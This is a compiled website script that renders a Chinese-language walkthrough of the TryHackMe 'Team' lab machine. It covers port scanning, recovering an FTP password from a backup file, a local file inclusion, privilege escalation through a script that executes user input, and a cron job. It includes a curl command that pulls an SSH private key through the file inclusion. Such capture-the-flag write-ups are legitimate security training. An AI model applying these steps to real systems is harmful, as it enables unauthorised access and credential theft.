"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1558],{99545:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>r,default:()=>o,frontMatter:()=>i,metadata:()=>c,toc:()=>d});var s=t(74848),a=t(28453);const i={sidebar_position:39,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","SUDO"],title:"Team",description:"Team",sidebar_label:"Team",slug:"/tryhackme/39"},r="Team",c={id:"box/TryHackMe/39",title:"Team",description:"Team",source:"@site/docs/box/TryHackMe/39.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/39",permalink:"/docs/tryhackme/39",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:39,frontMatter:{sidebar_position:39,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","SUDO"],title:"Team",description:"Team",sidebar_label:"Team",slug:"/tryhackme/39"},sidebar:"boxSidebar",previous:{title:"kiba",permalink:"/docs/tryhackme/38"},next:{title:"Gallery",permalink:"/docs/tryhackme/40"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"FTP",id:"ftp",level:2},{value:"80 --&gt; dev.team.thm",id:"80----devteamthm",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"Dale",id:"dale",level:3},{value:"Dale --&gt; gyles",id:"dale----gyles",level:3},{value:"gyles --&gt; root",id:"gyles----root",level:3}];function p(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"team",children:"Team"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-24-73:~# nmap -sT -p- --min-rate 1000 10.10.147.173\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-25 11:36 BST\nStats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\nConnect Scan Timing: About 89.29% done; ETC: 11:38 (0:00:11 remaining)\nNmap scan report for ip-10-10-147-173.eu-west-1.compute.internal (10.10.147.173)\nHost is up (0.00031s latency).\nNot shown: 65532 filtered ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:2C:55:76:10:69 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 100.59 seconds\nroot@ip-10-10-24-73:~# nmap -sTCV -p 21,22,80 --min-rate 1000 10.10.147.173\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-25 12:32 BST\nNmap scan report for ip-10-10-147-173.eu-west-1.compute.internal (10.10.147.173)\nHost is up (0.00014s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)\n|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)\n|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...\nMAC Address: 02:2C:55:76:10:69 (Unknown)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.24 seconds\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205218.png",alt:"20240627205218"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4ece\u9996\u9875\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u57df\u540d, \u4fee\u6539\u672c\u5730 hosts \u6587\u4ef6 ",(0,s.jsx)(e.code,{children:"team.thm"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205250.png",alt:"20240627205250"})}),"\n",(0,s.jsx)(e.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205308.png",alt:"20240627205308"})}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u4e8e\u626b\u63cf\u7ed3\u679c:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"scripts : \u5e94\u8be5\u662f\u4e2a\u76ee\u5f55"}),"\n",(0,s.jsx)(e.li,{children:"assets : \u548c scripts \u4e00\u6837"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ee7\u7eed\u6df1\u5165\u626b\u63cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205328.png",alt:"20240627205328"})}),"\n",(0,s.jsx)(e.p,{children:"\u53d1\u73b0\u4e00\u4e2a script.txt \u6587\u4ef6, \u67e5\u770b\u8be5\u5185\u5bb9\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a\u767b\u9646\u811a\u672c\u540c\u65f6\u544a\u8bc9\u6211\u4eec\u5b58\u5728\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6, \u5176\u4e2d\u6709\u5bc6\u7801"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205352.png",alt:"20240627205352"})}),"\n",(0,s.jsx)(e.p,{children:"\u6240\u4ee5\u6211\u5f00\u59cb\u679a\u4e3e\u540e\u7f00"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205404.png",alt:"20240627205404"})}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u8be5\u6587\u4ef6, \u53ef\u4ee5\u53d1\u73b0 FTP \u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205416.png",alt:"20240627205416"})}),"\n",(0,s.jsx)(e.h2,{id:"ftp",children:"FTP"}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528\u4e0a\u9762\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c FTP \u767b\u9646\u4e4b\u540e \u67e5\u770b\u5171\u4eab\u7684\u5185\u5bb9"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205439.png",alt:"20240627205439"})}),"\n",(0,s.jsxs)(e.p,{children:["\u8fd9\u5e94\u8be5\u662f ",(0,s.jsx)(e.code,{children:"ftpuser"})," \u7684\u5bb6\u76ee\u5f55, \u672c\u6765\u8ba1\u5212\u83b7\u53d6 ssh \u79c1\u94a5\u4f46\u662f\u6ca1\u6709\u6743\u9650, \u5728 worksahre \u4e2d\u6709\u4e00\u4e2a\u6587\u672c\u6587\u4ef6, \u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765\u67e5\u770b\u53d1\u73b0\u5176\u6307\u5411\u4e00\u4e2a\u5b50\u57df"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205457.png",alt:"20240627205457"})}),"\n",(0,s.jsx)(e.p,{children:"\u5176\u5b9e\u5728\u4e4b\u524d\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u6765\u83b7\u53d6\u8fd9\u4e9b\u4fe1\u606f"}),"\n",(0,s.jsx)(e.h2,{id:"80----devteamthm",children:"80 --\x3e dev.team.thm"}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u6211\u53d1\u73b0\u5176 URL \u53c2\u6570\u4e2d\u6307\u5b9a\u4e86\u4e00\u4e2a\u6587\u4ef6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205528.png",alt:"20240627205528"})}),"\n",(0,s.jsxs)(e.p,{children:["\u90a3\u4e48\u5e94\u8be5\u662f\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e, \u540c\u65f6\u5728\u4e4b\u524d\u4ece FTP \u4e2d\u83b7\u53d6\u7684\u4fe1\u606f\u544a\u8bc9\u6211\u4eec id_rsa \u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d, \u5728\u6b64\u6211\u4f7f\u7528\u5b57\u5178\u8fdb\u884c\u679a\u4e3e\u67e5\u770b ",(0,s.jsx)(e.a,{href:"https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",children:"LFI-gracefulsecurity-linux.txt"}),", \u679a\u4e3e\u540e\u6211\u4eec\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u5305\u542b\u5bc6\u94a5\u7684\u6587\u4ef6"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205610.png",alt:"20240627205610"})}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u540e\u8fdb\u884c\u8fde\u63a5\u5373\u53ef"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-15-42:~/teamcw# curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config | tail -n 39 | sed -s "s/#//g" > id_rsa\nroot@ip-10-10-15-42:~/teamcw# chmod 600 id_rsa\n'})}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"dale",children:"Dale"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205635.png",alt:"20240627205635"})}),"\n",(0,s.jsx)(e.p,{children:"\u53d1\u73b0\u7528\u6237\u5177\u6709 gyles \u7528\u6237\u7279\u6743"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205647.png",alt:"20240627205647"})}),"\n",(0,s.jsx)(e.h3,{id:"dale----gyles",children:"Dale --\x3e gyles"}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u6267\u884c\u6587\u4ef6"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'dale@TEAM:~$ cat ../gyles/admin_checks \n#!/bin/bash\n\nprintf "Reading stats.\\n"\nsleep 1\nprintf "Reading stats..\\n"\nsleep 1\nread -p "Enter name of person backing up the data: " name\necho $name  >> /var/stats/stats.txt\nread -p "Enter \'date\' to timestamp the file: " error\nprintf "The Date is "\n$error 2>/dev/null\n\ndate_save=$(date "+%F-%H-%M")\ncp /var/stats/stats.txt /var/stats/stats-$date_save.bak\n\nprintf "Stats have been backed up\\n"\n'})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205711.png",alt:"20240627205711"})}),"\n",(0,s.jsx)(e.h3,{id:"gyles----root",children:"gyles --\x3e root"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["\u67e5\u770b gyles \u7528\u6237\u7684\u5386\u53f2\u547d\u4ee4\u6211\u53d1\u73b0\u5176\u4e00\u76f4\u5bf9 ",(0,s.jsx)(e.code,{children:"/usr/local/bin/main_backup.sh"})," \u6587\u4ef6\u8fdb\u884c\u64cd\u4f5c, \u6839\u636e\u540d\u79f0\u63a8\u65ad\u6211\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u56e0\u6b64\u6211\u67e5\u770b\u8be5\u6587\u4ef6\u5e76\u8fdb\u884c\u4fee\u6539"]}),"\n",(0,s.jsx)(e.li,{children:"\u5f53\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u67e5\u627e\u672f\u8bed editors \u548c admin \u7ec4\u7684\u7279\u6b8a\u6587\u4ef6\u6765\u641c\u5bfb"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205732.png",alt:"20240627205732"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205740.png",alt:"20240627205740"})}),"\n",(0,s.jsx)(e.p,{children:"\u6267\u884c\u547d\u4ee4\u83b7\u53d6 root \u7684 Shell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205754.png",alt:"20240627205754"})})]})}function o(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(p,{...n})}):p(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>c});var s=t(96540);const a={},i=s.createContext(a);function r(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:r(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);